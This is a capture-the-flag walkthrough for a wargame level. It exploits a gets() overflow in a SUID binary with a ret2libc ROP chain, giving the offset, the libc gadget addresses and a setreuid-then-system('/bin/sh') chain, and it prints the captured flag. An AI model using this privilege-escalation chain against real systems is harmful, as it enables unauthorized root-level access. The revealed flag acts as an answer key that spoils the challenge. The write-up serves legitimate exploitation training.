# Rainfall — Level05 Walkthrough

## 1. Understanding the program

We connect as `level05`. The home directory contains the SUID binary
`wintermute` (owned by `flag05`) and its source `wintermute.c`.

The program reads a query with `gets(query)` into a 96-byte buffer,
computes a hash, XORs a 3x3 matrix with it, prints the hash and the
matrix, then displays the active nodes. The goal: run code as `flag05`
and read `/home/flag05/.pass`.

The hash and the matrix are red herrings: nothing in the program uses
them to influence control flow. The real vulnerability is the unbounded
`gets()`.

## 2. Finding the offset

In the disassembly of `run_query`:

```asm
sub    $0x70,%rsp
lea    -0x70(%rbp),%rax
call   gets@plt
```

The buffer is at `rbp-0x70`, so the saved return address sits at:

```text
0x70 + 0x8 = 0x78 = 120 bytes
```

## 3. Protections and technique

Same profile as level03: NX enabled (GNU_STACK RW), no stack canary, no
PIE, partial RELRO, and ASLR disabled on the VM with libc mapped at the
fixed address `0x00007ffff7c00000`.

Shellcode is out (NX), so execution is redirected through existing code:
a ret2libc ROP chain built from libc gadgets, exactly like level03.

## 4. Building the chain

The binary runs with euid = flag05 (1022) but uid = level05 (1006).
Calling `system("/bin/sh")` directly would not survive: dash drops the
effective uid when uid != euid (the trap met on level02/level04).
So the chain first calls `setreuid(1022, 1022)`.

| Item | Offset | Runtime address |
|---|---|---|
| `pop rdi ; ret` | 0x10c08d | 0x7ffff7d0c08d |
| `pop rsi ; ret` | 0x110b7d | 0x7ffff7d10b7d |
| `setreuid` | 0x127370 | 0x7ffff7d27370 |
| `system` | 0x58750 | 0x7ffff7c58750 |
| `"/bin/sh"` | 0x1cc42f | 0x7ffff7dcc42f |

```text
[120 padding]
pop rdi ; ret      1022            # ruid = flag05
pop rsi ; ret      1022            # euid = flag05
setreuid                           # uid = euid = flag05
pop rdi ; ret      &"/bin/sh"
system                             # rsp lands 8 mod 16, movaps safe
```

`gets` stops at a newline, so the payload must not contain 0x0a — none
of the addresses does.

## 5. Result

```text
uid=1022(flag05) gid=1008(level05) groups=1008(level05),1001(levelgroup)
67aaawdq0zcaaf3x57yh6irhvyjv3vs5
```

The flag is the SSH password for level06.
